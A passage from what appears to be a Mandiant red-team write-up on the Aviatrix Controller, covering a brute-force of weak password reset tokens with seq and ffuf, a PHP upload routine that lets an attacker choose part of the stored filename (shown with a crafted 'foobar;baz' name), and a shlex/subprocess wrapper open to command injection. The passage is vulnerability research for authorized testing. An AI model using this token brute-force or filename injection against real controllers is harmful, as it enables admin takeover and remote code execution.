decompilers. This meant we would need to read the Python bytecode manually, just like our ancestors did. We quickly downloaded a Python 3.10 interpreter and dumped the Bytecode to stdout:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">$ ~/.pyenv/versions/3.10.12/bin/python -c \\</span></code><br /><code><span style=\"vertical-align: baseline;\">\"import dis</span></code><br /><code><span style=\"vertical-align: baseline;\">import types</span></code><br /><code><span style=\"vertical-align: baseline;\">import marshal</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">with open(</span><span style=\"vertical-align: baseline;\">'</span><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">user_login_management.pyc</strong></span><span style=\"vertical-align: baseline;\">', 'rb') as f:</span></code><br /><code><span style=\"vertical-align: baseline;\">    f.read(0x10)</span></code><br /><code><span style=\"vertical-align: baseline;\">    code_object = marshal.load(f)</span></code><br /><code><span style=\"vertical-align: baseline;\">    dis.dis(code_object)\"</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">   4           0 LOAD_CONST               0 (0)</span></code><br /><code><span style=\"vertical-align: baseline;\">               2 LOAD_CONST               1 (None)</span></code><br /><code><span style=\"vertical-align: baseline;\">               4 IMPORT_NAME              0 (os)</span></code><br /><code><span style=\"vertical-align: baseline;\">               6 STORE_NAME               0 (os)</span></code><br /><code><span style=\"vertical-align: baseline;\">   5           8 LOAD_CONST               0 (0)</span></code><br /><code><span style=\"vertical-align: baseline;\">              10 LOAD_CONST               1 (None)</span></code><br /><code><span style=\"vertical-align: baseline;\">              12 IMPORT_NAME              1 (os.path)</span></code><br /><code><span style=\"vertical-align: baseline;\">              14 STORE_NAME               0 (os)</span></code><br /><code><span style=\"vertical-align: baseline;\">   6          16 LOAD_CONST               0 (0)</span></code><br /><code><span style=\"vertical-align: baseline;\">              18 LOAD_CONST               1 (None)</span></code><br /><code><span style=\"vertical-align: baseline;\">              20 IMPORT_NAME              2 (logging)</span></code><br /><code><span style=\"vertical-align: baseline;\">              22 STORE_NAME               2 (logging)</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Using this methodology, we could read the Bytecode representation of the source code. However, disassembled Python is quite verbose and the login logic is around 6,300 lines long. We don’t have that kind of time during a Red Team, so we needed to take a few shortcuts.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Authentication Bypass</span></h2>\n<p><span style=\"vertical-align: baseline;\">We used Gemini to obtain Python pseudocode from disassembled Python, which saved a lot of time. An interesting thing stood out: when initiating a password reset for an account, a 6-digit number was generated as a password reset token, ranging from 111,111 to 999,999. The Gemini generated pseudocode can be seen in the Figure 2.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"LLM generated pseudocode for the reset_password action\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: LLM generated pseudocode for the reset_password action</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The password reset token entropy was too weak to be effective, being 999,999 - 111,111 = 888,888 unique candidates. We couldn’t find any logic in the codebase that would invalidate the password reset upon too many invalid tokens. However, Aviatrix Controller only accepted the tokens for 15 minutes, after which the token would be invalidated.</span></p>\n<p><span style=\"vertical-align: baseline;\">This gave us a 15 minute window to attempt an account takeover, with shy of 900,000 candidates. With the attack theorized, we put together a password bruteforcer, using “</span><code style=\"vertical-align: baseline;\">seq -w 111111 999999 | sort --random-sort</code><span style=\"vertical-align: baseline;\">” as our input, and using </span><a href=\"https://github.com/ffuf/ffuf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ffuf</span></a><span style=\"vertical-align: baseline;\"> to issue the password reset requests.</span></p>\n<p><span style=\"vertical-align: baseline;\">We would need to repeat the following steps, every 15 minutes:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Generate a new candidate list, for good luck! (not really necessary, but it's nice to change things up)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Initiate a password reset via </span><code style=\"vertical-align: baseline;\">curl</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Start a </span><code style=\"vertical-align: baseline;\">ffuf</code><span style=\"vertical-align: baseline;\"> bruteforce with our new candidates</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">The bruteforcer was configured to ignore all requests matching the string “invalid or expired”, so that ffuf would only return valid password reset tokens. Note that sending a password reset would inevitably send an email to the configured administrator's email address, which is very noisy, although it was possible the admin account would not have a configured email. With the client’s approval to proceed with the account takeover, we started the bruteforce, targeting the default “admin” Aviatrix user, and after 16 hours and 23 minutes, we got a match as shown in Figure 3.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Identifying a valid password reset token\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig3a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Identifying a valid password reset token</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This token allowed us to perform a password reset of the administrator user, allowing us to authenticate to the Controller. We had breached the first layer of Aviatrix Controller’s security controls, giving us access to a plethora of cloud features, ranging from deploying OpenVPN configurations, creating users, obtaining user hashed credentials, reading from a local MongoDB, and more.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Hunting for Exploit Primitives</span></h2>\n<p><span style=\"vertical-align: baseline;\">Aviatrix takes a lot of precaution to ensure that compromised Controller credentials do not lead to complete cloud compromise. Namely, it did not appear possible for us to execute underlying commands on the Controller server, or spin up new cloud instances (EC2s, GCEs) that we could connect to. From a Red Teaming objective perspective, gaining access to the admin account was a </span><span style=\"font-style: italic; vertical-align: baseline;\">win</span><span style=\"vertical-align: baseline;\">, but it was not the win we had hoped for.</span></p>\n<p><span style=\"vertical-align: baseline;\">We set out to look for vulnerabilities that would lead to Remote Code Execution. One interesting piece of the code that caught our eye from the beginning was the very creative file upload handling, at the front-end (PHP) level, shown as follows:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">function upload_file($actionname, $key, $arr, $ext = array(), $type = null, $size = PHP_LIMIT_SIZE) {</span></code><br /><code><span style=\"vertical-align: baseline;\">    $res[\"return\"] = false;</span></code><br /><code><span style=\"vertical-align: baseline;\">    $invalid_extensions = array(\"php\", \"py\", \"htaccess\", \"zip\", \"sh\", \"pdf\");</span></code><br /><code><span style=\"vertical-align: baseline;\">    if (array_key_exists($key, $arr) &amp;&amp; !empty($arr[$key])) {</span></code><br /><code><span style=\"vertical-align: baseline;\">      switch ($arr[$key][\"error\"]) {</span></code><br /><code><span style=\"vertical-align: baseline;\">        case 0:</span></code><br /><code><span style=\"vertical-align: baseline;\">          <span style=\"color: #d93025;\">$filename = basename($arr[$key][\"name\"]);</span></span></code><br /><span style=\"color: #d93025;\"><code><span style=\"vertical-align: baseline;\">          <span style=\"color: #d93025;\">$extension = substr($filename, strrpos($filename, \".\") + 1);</span></span></code></span><br /><span style=\"color: #d93025;\"><code><span style=\"vertical-align: baseline;\">          <span style=\"color: #d93025;\">$extension = strtolower(explode(\" \", $extension)[0]);</span></span></code></span><br /><span style=\"color: #d93025;\"><code><span style=\"vertical-align: baseline;\">          <span style=\"color: #d93025;\">$filename = substr($filename, 0, strrpos($filename, \".\"));</span></span></code></span><br /><span style=\"color: #d93025;\"><code><span style=\"vertical-align: baseline;\">          <span style=\"color: #d93025;\">$filename = preg_replace(\"/\\s+/\", \"_\", $filename);</span></span></code></span><br /><code><span style=\"vertical-align: baseline;\">          if (!empty($ext) &amp;&amp; !in_array($extension, $ext)) {</span></code><br /><code><span style=\"vertical-align: baseline;\">            $res[\"reason\"] = \"Invalid file extension.\";</span></code><br /><code><span style=\"vertical-align: baseline;\">            [...]</span></code><br /><code><span style=\"vertical-align: baseline;\">          } else {</span></code><br /><code><span style=\"vertical-align: baseline;\">            $storedname = $actionname . \"-\" . $key;</span></code><br /><code><span style=\"vertical-align: baseline;\">            $newpath = \"/var/avxui/\" . $storedname . \".\" .</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">$extension</strong></span><span style=\"vertical-align: baseline;\">;</span></code><br /><code><span style=\"vertical-align: baseline;\">            <span style=\"color: #d93025;\">if (!move_uploaded_file($arr[$key][\"tmp_name\"], $newpath)) {</span></span></code><br /><code><span style=\"vertical-align: baseline;\">              $res[\"reason\"] = \"A problem occurred during file upload.\";</span></code><br /><code><span style=\"vertical-align: baseline;\">            } else {</span></code><br /><code><span style=\"vertical-align: baseline;\">              $res[\"return\"] = true;</span></code><br /><code><span style=\"vertical-align: baseline;\">              $res[\"filename\"] = $newpath;</span></code><br /><code><span style=\"vertical-align: baseline;\">            }</span></code><br /><code><span style=\"vertical-align: baseline;\">          }</span></code><br /><code><span style=\"vertical-align: baseline;\">    [...]</span></code><br /><code><span style=\"vertical-align: baseline;\">  return $res;</span></code><br /><code><span style=\"vertical-align: baseline;\">}</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This routine does quite a few things. First, while the </span><code style=\"vertical-align: baseline;\">upload_file()</code><span style=\"vertical-align: baseline;\"> function allowed for file extension allow-listing, it was rarely used in practice. For example, here are example calls to the function, found in the PHP front-end codebase, never specifying an extension allow-list:</span></p>\n<ul>\n<li><code style=\"vertical-align: baseline;\">upload_file($action, \"file\", $_FILES);</code></li>\n<li><code style=\"vertical-align: baseline;\">upload_file($action, \"ldap_ca_cert\", $_FILES);</code></li>\n<li><code style=\"vertical-align: baseline;\">upload_file($action, \"ldap_client_cert\", $_FILES);</code></li>\n<li><code style=\"vertical-align: baseline;\">upload_file($action, \"ldap_ca_cert\", $_FILES);</code></li>\n<li><code style=\"vertical-align: baseline;\">upload_file($action, \"ldap_client_cert\", $_FILES);</code></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">An interesting side-effect of this function was that uploaded files were written to disk but not removed after the files were processed. It was also possible to partially control the files being written to disk, namely via the file extension.</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, the following file upload request:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">Content-Disposition: form-data; name=\"</span><span style=\"vertical-align: baseline; color: #d93025;\">ldap_ca_cert</span><span style=\"vertical-align: baseline;\">\"; <br />filename=\"xxe.</span><span style=\"vertical-align: baseline; color: #1a73e8;\">foobar;baz</span><span style=\"vertical-align: baseline;\">\"</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">… would create the uploaded file as \"<code>/var/avxui/test_ldap_bind-<span style=\"color: #d93025;\">ldap_ca_cert</span>.<span style=\"color: #1a73e8;\">foobar;baz</span></code>\"</span><span style=\"vertical-align: baseline;\"> on the Aviatrix Controller filesystem. </span></p>\n<p><span style=\"vertical-align: baseline;\">The file upload routine would not allow slashes; it would truncate everything </span><span style=\"font-style: italic; vertical-align: baseline;\">after</span><span style=\"vertical-align: baseline;\"> the first space, and ignore everything </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> the last period character (.). Interestingly, the controller allowed tab characters in filenames. Here are example filenames, and how they would be written to disk:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; margin-left: auto; margin-right: auto;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Uploaded file</span></strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">File on disk</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">foobar.abc</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">{action}.abc</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">foobar.abc.xyz</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">{action}.xyz</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">foobar.abc/def.ghj</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">{action}.ghj</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">foobar.abc .xyz</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">{action}.abc</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">foobar.abc{tab}xyz</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">{action}.abc{tab}xyz</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Having control over a partial filename stored to disk, Mandiant set out to look for command injection vulnerabilities. If the Controller backend insecurely used the uploaded file name in a command line argument, it could be possible to inject into the shell command to perform Remote Code Execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">Another interesting architectural decision we observed was that the Controller used command-line utilities to do OS level operations. For example, the Controller ran the \"</span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\">\" program instead of using a Python library to handle file copying. This introduced a significant attack surface, especially since we could control partial filenames.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant observed an interesting pattern while looking at the library code used to run operating system commands, where the commands to be executed were built as a string, and later tokenized. This is shown in the following Python bytecode:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">// Disassembly of tools.sysutils.txt</span></code><br /><code><span style=\"vertical-align: baseline;\">Disassembly of </span><span style=\"vertical-align: baseline; color: #d93025;\">get_system_cmd_output</span><span style=\"vertical-align: baseline;\">:</span></code><br /><code><span style=\"vertical-align: baseline;\">276           0 LOAD_FAST                0 (cmd)</span></code><br /><code><span style=\"vertical-align: baseline;\">              2 STORE_FAST               8 (cmd_)</span></code><br /><code><span style=\"vertical-align: baseline;\">277           4 LOAD_FAST                3 (shell)</span></code><br /><code><span style=\"vertical-align: baseline;\">              6 POP_JUMP_IF_TRUE        14 (to 28)</span></code><br /><code><span style=\"vertical-align: baseline;\">              8 LOAD_GLOBAL              0 (isinstance)</span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">10 LOAD_FAST                0 (cmd)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             12 LOAD_GLOBAL              1 (list)</span></code><br /><code><span style=\"vertical-align: baseline;\">             14 CALL_FUNCTION            2</span></code><br /><code><span style=\"vertical-align: baseline;\">             16 POP_JUMP_IF_TRUE        14 (to 28)</span></code><br /><code><span style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">278          18 LOAD_GLOBAL              2 (shlex)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">20 LOAD_METHOD              3 (split)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">22 LOAD_FAST                0 (cmd)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             24 CALL_METHOD              1</span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">26 STORE_FAST               8 (cmd_)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">291          64 LOAD_GLOBAL              5 (subprocess)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">66 LOAD_ATTR                6 (check_output)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">             <span style=\"color: #d93025;\">68 LOAD_FAST                8 (cmd_)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\">             80 STORE_FAST              10 (res)</span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\">            <span style=\"color: #d93025;\">242 LOAD_FAST               12 (res)</span></span></code><br /><code><span style=\"vertical-align: baseline;\">            <span style=\"color: #d93025;\">244 CALL_METHOD              1</span></span></code><br /><code><span style=\"vertical-align: baseline;\">            <span style=\"color: #d93025;\">246 RETURN_VALUE</span></span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This bytecode could be translated to Python in this way:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">def get_system_cmd_output(cmd, [...]):</span></code><br /><code><span style=\"vertical-align: baseline;\">    cmd_ = </span><span style=\"vertical-align: baseline; color: #d93025;\">shlex.split(cmd)</span><span style=\"vertical-align: baseline;\"> </span></code><br /><code><span style=\"vertical-align: baseline;\">    return </span><span style=\"vertical-align: baseline; color: #d93025;\">subprocess.check_output(cmd_)</span><span style=\"vertical-align: baseline;\">)</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This meant that individual features of Aviatrix Controller would build commands as strings, such as the following:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">get_system_cmd_output(\"cp /folder/fileA 